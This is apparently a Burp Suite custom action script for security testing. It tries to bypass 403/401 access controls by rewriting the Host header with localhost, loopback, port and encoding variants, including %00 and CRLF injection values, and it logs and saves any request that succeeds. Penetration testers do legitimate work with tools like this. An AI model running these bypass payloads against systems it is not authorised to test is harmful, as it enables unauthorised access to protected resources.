id: b089c2e1-45f8-4b7b-9c6d-bypass-host-001
name: 403/401 Bypass - Host Header
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - Host Header Manipulation
  // Tests bypass by modifying the Host header
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  int originalStatus = requestResponse.response().statusCode();
  String originalHost = httpService.host();
  
  logging.logToOutput("=== 403/401 Bypass - Host Header ===");
  logging.logToOutput("Target: " + originalHost + originalRequest.path());
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  String[] hostPayloads = {
      "localhost", "localhost:80", "localhost:443", "localhost:8080",
      "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", "127.0.0.1:8080",
      "0.0.0.0", "0.0.0.0:80", "0.0.0.0:443",
      originalHost + ":80", originalHost + ":443", 
      originalHost + ":8080", originalHost + ":8443",
      originalHost + ".", originalHost + "..",
      originalHost + "%00", originalHost + "%0d%0a",
      "127.1", "::1", "[::1]", "[::1]:80"
  };
  
  for (String hostPayload : hostPayloads) {
      try {
          var req = originalRequest.withHeader("Host", hostPayload);
          var resp = api.http().sendRequest(req);
          Thread.sleep(DELAY_MS);
          
          int status = resp.response().statusCode();
          String note = "Host: " + hostPayload + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              success++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
              rr.annotations().setNotes("Host Header Bypass: " + note);
              api.organizer().sendToOrganizer(rr);
          } else if (VERBOSE) {
              logging.logToOutput("[-] " + note);
          }
          total++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
